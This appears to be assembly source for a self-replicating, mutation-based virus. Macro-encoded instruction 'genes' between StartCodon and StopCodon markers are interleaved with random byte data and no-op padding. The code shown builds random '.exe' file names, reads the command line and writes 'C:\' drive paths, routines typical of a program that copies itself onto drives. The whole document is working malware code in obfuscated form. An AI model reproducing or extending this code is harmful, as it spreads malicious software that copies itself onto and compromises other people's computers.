db 252
db 176
db 79
db 170
db 7
db 234
db 73
db 83
db 249
db 224
db 166
db 180
db 215
db 138
db 37
db 14
db 225
db 178
db 125
db 126
db 9
db 219
db 109
db 80
db 141
db 241
db 97
db 115
db 241
db 2
db 207
db 2
db 70
db 4
db 203
db 213
db 41
db 39
db 154
db 188
db 247
db 15
db 191
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
db StopCodon
db 134
db 17
db 23
db 229
db 84
db 172
db 36
db 79
db 4
db 62
db 82
db 137
db 230
db 109
db 72
db 200
db 218
db 122
db 41
db 43
db 241
db 75
db 178
db 72
db 246
db 85
db 222
db 131
db 96
db 201
db 195
db 36
db 30
db 51
db 193
db 71
db 224
db 35
db 58
db 114
db 188
db 185
db 39
db 48
db 38
db 69
db 13
db 198
db 208
db 113
db 99
db 67
db 199
db 183
db 74
db 246
db 16
db 27
db 239
db 200
db 199
db 153
db 46
db 99
db 217
db 248
db 49
db 99
db 69
db 169
db 155
db 135
db 90
db 12
db 85
db 189
db 210
db 64
db 142
db 79
db 158
db 19
db 22
db 138
db 8
db 101
db 14
db 36
db 78
db 169
db 35
db 160
db 209
db 39
db 61
db 168
db 159
db 191
db 236
db 243
db 246
db 20
db 149
db 29
db 58
db 233
db 64
db 139
db 155
db 213
db 105
db 38
db 11
db 63
db 38
db 202
db 212
db 141
db 154
db 169
db 248
db 62
db 79
db 166
db 96
db 74
db 188
db 162
db 203
db 38
db 245
db 147
db 65
db 28
db 51
db 105
db 178
db 123
db 30
db 36
db StartCodon
       _JnzUp                   ; jnz esi
; loop RndNameLoop
    _getDO
    BigNum=rndext-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 135
db 78
db 59
db 18
db 71
db 227
db 104
db 234
db 73
db 149
db 246
db 218
db 119
db 167
db 67
db 191
db 18
db 235
db 8
db 136
db 20
db 110
db 27
db 195
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 240
db 7
db StartCodon
        _pop
db StopCodon
db 245
db 229
db 61
db 56
db 38
db 94
db 127
db 116
db 246
db 169
db 250
db 42
db 109
db 134
db 135
db 202
db 251
db 240
db 251
db 22
db 20
db 230
db 101
db 100
db 156
db 50
db 215
db 56
db 53
db 145
db 227
db 38
db 149
db 52
db 212
db 195
db 217
db 102
db 80
db 242
db 183
db 164
db 233
db 50
db 68
db 46
db 167
db 37
db 102
db 42
db 160
db 70
db 170
db 31
db 73
db 192
db 126
db 251
db 112
db 184
db 231
db 38
db 227
db 63
db 14
db 148
db 20
db 196
db 231
db 31
db 41
db 78
db 104
db 93
db 69
db 33
db 67
db 123
db 215
db 217
db 229
db 109
db 175
db 27
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='.exe'
    AlreadyStarted=0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 29
db 166
db 60
db 68
db 198
db 105
db 112
db 170
db 122
db 74
db 23
db 49
db 195
db 62
db 119
db 0
db 14
db 153
db 30
db 237
db 151
db 35
db 188
db 55
db 42
db 6
db 79
db 60
db 196
db 173
db 230
db 64
db 154
db 65
db 30
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 108
db 159
db 186
db 246
db 21
db 56
db 50
db 239
db 247
db 46
db 236
db 168
db 106
db 120
db 86
db 231
db 122
db 184
db 191
db 197
db 238
db 49
db 24
db 84
db 164
db 14
db 203
db 86
db 232
db 16
db 194
db 32
db 80
db 95
db 197
db 144
db 183
db 36
db 64
db 3
db 254
db 233
db 190
db 123
db 178
db 244
db 147
db 24
db 169
db 23
db 161
db 81
db 183
db 204
db 92
db 76
db 174
db 18
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord              ; create extention
    _getDO
    BigNum=hGetCommandLineA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0xFF
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _nopsA
       _getdata
       _and
       _nopdB           ; RegB=1st byte of filename
_save           ; BC2=BC1
db StopCodon
db 161
db 108
db 114
db 187
db 148
db 93
db 32
db 253
db 88
db 183
db 144
db 55
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=34
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdD           ; RegD=34
       _nopsB
       _save
       _nopsD
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 149
db 198
db 19
db 132
db 196
db 82
db 44
db 207
db 243
db 197
db 121
db 50
db 16
db 255
db 210
db 146
db 218
db 250
db 14
db 195
db 78
db 249
db 52
db 247
db 206
db 53
db 186
db 38
db 247
db 150
db 126
db 93
db 105
db 219
db 6
db 5
db 227
db 172
db 56
db 165
db 192
db 84
db 32
db 114
db 139
db 27
db 145
db 252
db 171
db 14
db 57
db 168
db 181
db 99
db 212
db 5
db 153
db 110
db 100
db 24
db 21
db 254
db 25
db 18
db 146
db 216
db 87
db 127
db 32
db 165
db 0
db 99
db 81
db 42
db 235
db 66
db 251
db 56
db 214
db 126
db 125
db 243
db 25
db 176
db 195
db 94
db 0
db 85
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
       _JnzDown
           _nopsA
           _add0001
           _nopdA
           _nopREAL
       _nopsA
       _push               ; Save RegA at stack
; FindEndOfString:
       _getEIP
db StopCodon
db 199
db 243
db 252
db 153
db 232
db 89
db 103
db 8
db 61
db 17
db 172
db 225
db 83
db 185
db StartCodon
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _saveJmpOff         ; mov esi, eip
       _nopsA
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
_save           ; BC2=BC1
db StopCodon
db 227
db 172
db 64
db 209
db 44
db 33
db 183
db 254
db 174
db 42
db 222
db 232
db 214
db 226
db 255
db 242
db 53
db 42
db 249
db 159
db 7
db 251
db 248
db 132
db 226
db 39
db 105
db 166
db 160
db 1
db 45
db 10
db 39
db 137
db 90
db 84
db 252
db 122
db 36
db 121
db 151
db 96
db 9
db 249
db 132
db 2
db 106
db 150
db 123
db 205
db 111
db 9
db 239
db 130
db 119
db 225
db 19
db 100
db 124
db 81
db 14
db 41
db 72
db 205
db 130
db 170
db 27
db 162
db 131
db 140
db 55
db 9
db 205
db 10
db 172
db 214
db 151
db 220
db 20
db 213
db 179
db 158
db 109
db 142
db 68
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0xFF
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 41
db 16
db 181
db 173
db 166
db 103
db 143
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 35
db 205
db 196
db 56
db 49
db 113
db 84
db 226
db 73
db 218
db 189
db 108
db 153
db 145
db 135
db 75
db 199
db 115
db 78
db 153
db 246
db 223
db 229
db 35
db 31
db 82
db 140
db 55
db 165
db 18
db 97
db 26
db 53
db 153
db 144
db 95
db 86
db 100
db 29
db 116
db 6
db 148
db StartCodon
        _pushall                ; save all registers
db StopCodon
db 17
db 162
db 46
db 205
db 59
db 230
db 24
db 222
db 16
db 159
db 222
db 106
db 102
db 119
db 171
db 246
db 86
db 201
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 162
db 153
db 246
db 57
db 34
db 190
db 67
db 74
db StartCodon
        _pushall        ; Restore ZF
db StopCodon
db 214
db 49
db 49
db 155
db 196
db 57
db 121
db 61
db 8
db 225
db 33
db 121
db 228
db 92
db 78
db 48
db StartCodon
        _save
        _and
        _popall
    end if
       _save
       _nopsA
       _getdata
       _and
       _nopdD               ; RegD=(dword[Name+count]&& 0xFF)
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=34
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _nopsB               ; 1st Byte of filename
        _pushall
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
db StopCodon
db 1
db 133
db 252
db 206
db 159
db 151
db 12
db StartCodon
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
       _JnzDown
           _nopsD
           _xor
           _JnzUp
           _nopREAL
; EndFindEndOfString:
       _nopsA
db StopCodon
db 24
db 10
db 109
db 201
db 161
db 182
db 2
db 31
db 212
db 30
db 141
db 51
db 61
db 55
db StartCodon
       _saveWrtOff
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 0
db 153
db 32
db 1
db 56
db 219
db 56
db 234
db 197
db 10
db 228
db 45
db 180
db 57
db 31
db 48
db 184
db 153
db 92
db 237
db 88
db 180
db 168
db 114
db 182
db 96
db 250
db 190
db 90
db 228
db 132
db 43
db 141
db 253
db 72
db 132
db 235
db 165
db 151
db 248
db 87
db 7
db 241
db 240
db 15
db 248
db 217
db 71
db 228
db 6
db 22
db 156
db 182
db 213
db 20
db 122
db 157
db 61
db 248
db 156
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
    BigNum=34
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
_nopREAL
_nopREAL
_nopREAL
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 195
db 66
db 70
db 19
db 53
db StartCodon
        _pushall                ; save all registers
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 130
db 20
db 144
db 108
db 137
db 72
db 204
db 188
db 139
db 31
db 255
db 241
db 32
db 155
db 195
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 11
db 41
db 21
db 11
db 170
db 250
db 61
db 121
db 77
db 67
db 165
db 125
db 202
db 146
db 168
db 218
db 127
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 21
db 43
db 231
db 99
db 117
db 38
db 118
db 51
db 254
db 193
db 231
db 225
db 198
db 146
db 210
db 188
db 209
db 38
db 71
db 31
db 31
db 62
db 231
db 138
db 228
db 167
db 153
db 124
db 219
db 150
db 115
db 182
db 191
db 150
db 166
db 188
db 39
db 95
db 124
db 166
db 167
db 185
db 71
db 14
db 108
db 206
db 6
db 229
db 111
db 60
db 157
db 37
db 150
db 49
db 58
db 137
db 172
db 113
db 2
db 37
db 121
db 151
db 163
db 236
db 109
db 76
db 222
db 210
db StartCodon
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 255
db 232
db 212
db 87
db 66
db 14
db 126
db 171
db 223
db 26
db 223
db 161
db 91
db 210
db 106
db 82
db 151
db 74
db 123
db 204
db 224
db 113
db 212
db 30
db 108
db 57
db 102
db 162
db 112
db 84
db 128
db 140
db 56
db 160
db 220
db 95
db 106
db 19
db 91
db 3
db 6
db 65
db 4
db 22
db 85
db 243
db 106
db 172
db 86
db 54
db 56
db 91
db 227
db 65
db 247
db 200
db 72
db 36
db 145
db 44
db 47
db 213
db 1
db 183
db 97
db 215
db 3
db 183
db 242
db 88
db 193
db 213
db 167
db 114
db 4
db 224
db 13
db 186
db 149
db 203
db 179
db 166
db 88
db 35
db 222
db 163
db 97
db 144
db 82
db 22
db 1
db 108
db 28
db 49
db 164
db 165
db 132
db 180
db 145
db 240
db 89
db 210
db 173
db 90
db 154
db 70
db 183
db 20
db 212
db 52
db 102
db 75
db 183
db 78
db 65
db 102
db 163
db 231
db 193
db 17
db 132
db 134
db 238
db 104
db 120
db 154
db 4
db 210
db 234
db 30
db 154
db StartCodon
        _save
        _and
        _popall
    end if
       _nopsB               ; 1st Byte of filename
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 133
db 123
db 148
db 222
db 185
db 187
db 138
db 216
db 10
db 98
db 78
db 35
db 105
db 166
db 172
db 188
db 194
db 7
db 47
db 129
db 57
db 62
db 79
db 36
db 7
db 194
db 204
db 44
db 176
db 140
db 211
db 196
db 37
db 21
db 231
db 7
db 254
db 137
db StartCodon
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
       _JnzDown
           _save
           _xor
           _writeByte
           _nopREAL
       _pop
       _nopdA
    _getDO
_nopREAL
_nopREAL
    BigNum=Driveletter3-1-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 75
db 150
db 131
db 217
db 74
db 70
db 41
db 164
db 177
db 141
db 130
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
db StopCodon
db 136
db 219
db 148
db 23
db 110
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x5C3A4300
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 213
db 146
db 95
db 109
db 133
db 185
db 20
db 225
db 19
db 148
db 80
db 189
db 41
db 51
db 60
db 69
db 76
db 88
db 6
db 249
db 90
db 81
db 90
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 251
db 132
db 74
db 149
db 97
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 141
db 102
db 184
db 6
db 75
db 96
db 212
db 239
db 68
db 239
db 97
db 237
db 140
db 87
db 106
db 17
db 50
db 23
db 208
db 231
db 193
db 113
db 198
db 159
db 212
db 122
db 170
db 235
db 170
db 6
db 91
db 184
db 19
db 121
db 174
db 142
db 134
db 85
db 60
db 212
db 4
db 164
db 130
db 178
db 153
db 203
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
    _getDO
